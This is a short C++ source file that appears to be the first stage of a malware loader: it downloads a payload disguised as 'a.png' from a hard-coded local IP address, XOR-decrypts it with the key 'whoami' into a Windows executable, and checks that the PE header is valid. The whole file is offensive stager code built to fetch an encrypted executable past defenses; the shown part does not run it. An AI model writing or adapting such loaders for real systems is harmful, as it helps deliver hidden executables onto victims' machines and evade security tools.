#include <iostream>
#include "Download.h"
#include "XorDecryptPE.h"

int main()
{
    const char* peUrl = "http://192.168.110.130:8000/a.png"; 
    std::vector<BYTE> fileBuffer = DownloadPEFromUrl(peUrl);
	std::cout << "Downloaded " << fileBuffer.size() << " bytes from " << peUrl << std::endl;

    XorDecryptPE(fileBuffer, "whoami");

    if (IsValidPEHeader(fileBuffer)) {
        std::cout << "PE header is valid after decryption." << std::endl;
    }
    else {
        std::cout << "Invalid PE header after decryption." << std::endl;
	}
}

